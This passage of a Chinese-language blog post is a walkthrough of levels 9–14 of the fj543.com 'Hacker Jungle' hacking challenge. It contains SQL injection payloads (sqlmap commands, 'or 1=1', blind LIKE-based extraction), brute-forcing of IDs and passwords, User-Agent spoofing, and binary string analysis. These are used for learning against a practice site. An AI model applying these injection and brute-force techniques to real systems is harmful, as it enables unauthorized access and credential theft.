href="http://www.fj543.com/hack/?level=91ie543">http://www.fj543.com/hack/?level=91ie543</a></p><blockquote><p>提示语：使用IE 5.43版本的浏览器访问?level=9token可以得到令牌。(Use IE 5.43 version to browse ?level=9token) </p></blockquote><p>抓包改URL和浏览器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /hack/?level=91ie543 HTTP/1.1</span><br><span class="line">Host: www.fj543.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0</span><br></pre></td></tr></table></figure><p>改为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /hack/?level=9token HTTP/1.1</span><br><span class="line">Host: www.fj543.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 IE 5.43</span><br></pre></td></tr></table></figure><p><code>您的令牌(Token):level9495216</code></p><p>回到原来的URL输入令牌。</p><p>10-<a href="http://www.fj543.com/hack/?level=g1012495216">http://www.fj543.com/hack/?level=g1012495216</a></p><blockquote><p>提示语：请下载<a href="http://www.fj543.com/hack/files/10token.zip">令牌生成器(Token Generator)</a>。解压密码不长,但很复杂。(Download it.The zip password is short,but very complex)  </p></blockquote><p>去winhex查一下是不是真加密，真加密就爆破zip，结果为<code>o0_O</code>。输入密码，执行exe程序生成口令。但当我们点击<code>aux.10.txt</code>后它说找不到文件，用什么文字编辑器都打不开。wp说它属于特殊文件名，只能用cmd打开：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#type指令打开常规方法无法打开的文件</span><br><span class="line">type \\.[txt文件的绝对路径]</span><br><span class="line">type \\.\C:\Users\dell\Desktop\10token\aux.10.txt</span><br><span class="line">你的令牌(Token):key104957591</span><br><span class="line">只在今天有效(It&#x27;s available only today)</span><br></pre></td></tr></table></figure><p>11-<a href="http://www.fj543.com/hack/?level=lv11">http://www.fj543.com/hack/?level=lv11</a></p><blockquote><p>提示语：一个表情，却是有声有色。(I like the beautiful face and the voice) </p></blockquote><p>用winhex打开看到字符串</p><blockquote><p>GIF89a……——————————password end,and password start——————————RIFF$WAVEfmt</p></blockquote><p>前面是GIF图片，后面RIFF$WAVEfmt是音频文件格式。用winhex将前面的GIF部分删除，剩下的另存为.wav文件，音频说<code>表情加上6688</code>，我的是微笑表情，所以<code>smile6688</code>通过。</p><p>12-<a href="http://www.fj543.com/hack/?level=g1213495759">http://www.fj543.com/hack/?level=g1213495759</a></p><blockquote><p>您需要获取两个临时ID的认证，才能看到本关的秘密！(You should get two Authentication)<br>1.下载第12关认证软件，用它申请认证一个软件临时ID.(Download it. And use it to Authenticate the TempID of software)<br>2.回到此窗口，想办法手工申请认证你的网页临时ID.(Then back to this window.Try to Authenticate the TempID of web)</p><p>提示语：你的网页临时ID是191.半小时内有效，若失效请刷新网页。(This is your TempID of web) </p></blockquote><p>下载解压后win10一定一定要以管理员身份运行，否则根本打不开！</p><blockquote><p>临时ID：455</p><p>在线认证开始(Started)</p><p>验证第一步(step1)…Step1 ok</p><p>验证第二步(step2)…Step2 ok</p><p>已完成软件临时ID的认证。接下来请回到浏览器中申请网页临时ID的认证。(Software TempID is authenticated.Please back to the browser window.Try to Authenticate the TempID of web)</p></blockquote><p>什么都没有，就给了个临时ID，先用winhex打开看看</p><blockquote><p>User-Agent: Mozilla/4.0 (compatible; HackersGameBrowser)</p><p><a href="http://www.fj543.com/hack/">http://www.fj543.com/hack/</a>  寶翄,{Nek(step1)  ?act=step1&amp;code=  寶翄,{孨ek(step2)  ?act=step2&amp;code=  step1ok step2ok</p></blockquote><p>可以看到关键信息<code>?act=step1&amp;code=</code>和<code>?act=step2&amp;code=</code>，提交链接应该就是这些。</p><p>先把刚才的软件临时ID构造<code>http://www.fj543.com/hack/?act=step1&amp;code=455</code>，但会出现以下错误：</p><blockquote><p>Error:你的临时ID应该是162.(Your TempID should be this one) </p></blockquote><p>抓包把User-Agent换成上面那个就可以了。</p><blockquote><p> Step1 ok </p></blockquote><p>接下来获取第二个临时ID，猜测<code>http://www.fj543.com/hack/?act=step2&amp;code=455</code>显示</p><blockquote><p> Error:Bad Code </p></blockquote><p>现在已知code总是3位数，那就直接爆破。有些code都返回了<code>Step2 ok</code>但怎么进去下一关啊？感觉是bug。找到状态302，就是正确code，在URL上打就刷新出第13关入口。</p><p>13-<a href="http://www.fj543.com/hack/?level=13sql">http://www.fj543.com/hack/?level=13sql</a></p><blockquote><p>你的ID是(Your ID)： 154<br>你的密码(Your password)： </p><p>提示语：请从/hack/13sql.asp挖掘出这个ID对应的密码。(Try to find the password for the ID)  </p></blockquote><p>去到<a href="http://www.fj543.com/hack/13sql.asp">http://www.fj543.com/hack/13sql.asp</a></p><blockquote><p>这是一个数据库信息查证页面，提交一个ID，会显示查询结果。(Submit an ID,then it will show you the query result)</p><p>数据库中有这条信息,但我不能直接告诉你密码。(The data exists.But I can’t show you the password)  </p></blockquote><p>POST形式的SQL注入，也可以用sqlmap自动化注入，参数可以抓包看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://www.fj543.com/hack/13sql.asp --data=&quot;id=154&amp;password=111&quot; --batch</span><br><span class="line">sqlmap -u http://www.fj543.com/hack/13sql.asp --data=&quot;id=154&amp;password=111&quot; --batch --tables</span><br></pre></td></tr></table></figure><p>自动化注入好像不行，开始手注。</p><p>输入1</p><blockquote><p> 数据库中有这条信息,但我不能直接告诉你密码。 </p></blockquote><p>输入1 and 1=1</p><blockquote><p> 数据库中有这条信息,但我不能直接告诉你密码。 </p></blockquote><p>输入-1</p><blockquote><p> 没有找到此ID对应的内容。 </p></blockquote><p>输入-1 or 1=1</p><blockquote><p> 数据库中有这条信息,但我不能直接告诉你密码。 </p></blockquote><p>反正就不告诉我，普通手注从网页中返回不了有效信息，大佬们wp中的思路：猜密码的字段名为pwd，构造<code>154 and pwd like &#39;%a%&#39;</code>，抓包，将$a$暴力破解。我猜意思是pwd是由暴力破解得出的字符组成的。</p><blockquote><p>id=154+and+pwd+like+%27%25a%25%27</p><p>id=154+and+pwd+like+%27%25$a$%25%27</p></blockquote><p>破解发现<code>bdguvBDGUV</code>都有，我猜密码是5个字符，不区分大小写。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;bdguv.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.permutations(<span class="string">&#x27;bdguv&#x27;</span>, <span class="number">5</span>):</span><br><span class="line">    c = <span class="string">&#x27;&#x27;</span>.join(i)</span><br><span class="line">    f.write(c+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>回到<code>http://www.fj543.com/hack/?level=13sql</code>抓包，设置参数用bdguv.txt爆破。返回状态302的即是正确密码。</p><p>14-<a href="http://www.fj543.com/hack/?level=14crack">http://www.fj543.com/hack/?level=14crack</a></p><p>令牌下载下来的名字<code>file.exe.html</code>，将html删去，运行一下，让我们输入密码。扔去OD看看字符串：右键-&gt;中文搜索引擎-&gt;智能搜索</p><p>可以看到一些奇怪的字符串，组合起来为<code>love543</code>，估计这个就是密码，输入就可得到令牌。</p><p>通关。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;http://www.fj543.com/hack/&quot;&gt;黑客丛林之旅&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;1-&lt;a href=&quot;http://www.fj543.com/hack/?level=1&quot;&gt;http://www.fj543.com/hack/?level=1&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;提示语：在浏览器端用脚本进行身份验证是很容易被破解的。(The Client-side authentication is not secure) &lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="综合" scheme="http://example.com/categories/%E7%BB%BC%E5%90%88/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
  </entry>
  
</feed>
